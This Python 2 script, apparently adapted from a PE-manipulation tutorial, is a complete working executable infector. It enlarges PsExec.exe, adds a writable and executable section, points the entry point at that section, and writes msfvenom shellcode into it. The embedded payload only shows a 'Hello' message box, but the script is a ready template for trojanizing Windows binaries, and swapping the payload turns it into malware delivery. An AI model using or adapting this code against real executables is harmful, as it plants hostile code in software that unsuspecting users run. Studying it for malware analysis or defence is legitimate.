#http://breakinsecurity.com/pe-format-manipulation-with-pefile/
#32bit support only
import mmap
import pefile
import os

def cleanterminal():
	'''
	Clean the terminal window and set title
	'''
	os.system("cls" if os.name == "nt" else "clear")
	os.system("title pyPE_injection")

def banner():
	print ">> Inject shellcode into PE section header"

def infect():
	def align(val_to_align, alignment):
		return ((val_to_align + alignment - 1) / alignment) * alignment

	'''
	Path to executable
	'''
	exe_path = "PsExec.exe"

	'''
	Resize the Executable
	'''
	print "\n[!] Resizing the Executable"

	original_size = os.path.getsize(exe_path)
	print "\t[+] Original Size = %d" % original_size
	fd = open(exe_path, 'a+b')
	map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
	map.resize(original_size + 0x4000) #0x2000
	map.close()
	fd.close()
	print "\t[+] New Size = %d bytes\n" % os.path.getsize(exe_path)

	'''
	Add the new section header that will contain our shellcode
	'''
	print "[!] Adding the new section header"
	pe = pefile.PE(exe_path)
	number_of_section = pe.FILE_HEADER.NumberOfSections
	last_section = number_of_section - 1
	file_alignment = pe.OPTIONAL_HEADER.FileAlignment
	section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
	new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

	raw_size = align(0x1000, file_alignment)
	virtual_size = align(0x1000, section_alignment)
	raw_offset = align((pe.sections[last_section].PointerToRawData +
						pe.sections[last_section].SizeOfRawData),file_alignment)

	virtual_offset = align((pe.sections[last_section].VirtualAddress +
						pe.sections[last_section].Misc_VirtualSize),section_alignment)


	characteristics = 0xE0000020
	name = ".acx" + (4 * '\x00')

	pe.set_bytes_at_offset(new_section_offset, name)
	print "\t[+] Section Name = %s" % name
	pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
	print "\t[+] Virtual Size = %s" % hex(virtual_size)
	pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
	print "\t[+] Virtual Offset = %s" % hex(virtual_offset)
	pe.set_dword_at_offset(new_section_offset + 16, raw_size)
	print "\t[+] Raw Size = %s" % hex(raw_size)
	pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
	print "\t[+] Raw Offset = %s" % hex(raw_offset)
	pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00'))
	pe.set_dword_at_offset(new_section_offset + 36, characteristics)
	print "\t[+] Characteristics = %s\n" % hex(characteristics)
	
	'''
	Modify the Main Headers
	'''
	print "[!] Modifing the main headers"
	pe.FILE_HEADER.NumberOfSections += 1
	print "\t[+] Number of Sections = %s" % pe.FILE_HEADER.NumberOfSections
	pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
	print "\t[+] Size of Image = %d bytes" % pe.OPTIONAL_HEADER.SizeOfImage
	pe.write(exe_path)

	pe = pefile.PE(exe_path)
	number_of_section = pe.FILE_HEADER.NumberOfSections
	last_section = number_of_section - 1
	new_ep = pe.sections[last_section].VirtualAddress
	print "\t[+] New Entry Point = %s" % hex(pe.sections[last_section].VirtualAddress)
	oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
	print "\t[+] Original Entry Point = %s\n" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
	pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep
	
	#msfvenom -a x86 --platform windows -p windows/messagebox
	#TEXT="Hello" ICON=INFORMATION EXITFUNC=process TITLE="Hello" -f python
	shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
				b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
				b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
				b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
				b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
				b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
				b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
				b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
				b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
				b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
				b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
				b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
				b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
				b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
				b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
				b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x58\x20\x20\x68"
				b"\x48\x65\x6c\x6c\x31\xdb\x88\x5c\x24\x05\x89\xe3\x68"
				b"\x6f\x58\x20\x20\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c"
				b"\x24\x05\x89\xe1\x31\xd2\x6a\x40\x53\x51\x52\xff\xd0"
				b"\x31\xc0\x50\xff\x55\x08")

	print "[!] Injecting the shellcode in the new section"
	raw_offset = pe.sections[last_section].PointerToRawData
	pe.set_bytes_at_offset(raw_offset, shellcode)
	print "\t[+] Shellcode wrote in the new section"
	pe.write(exe_path)

if __name__ == '__main__':
	cleanterminal()
	banner()
	infect()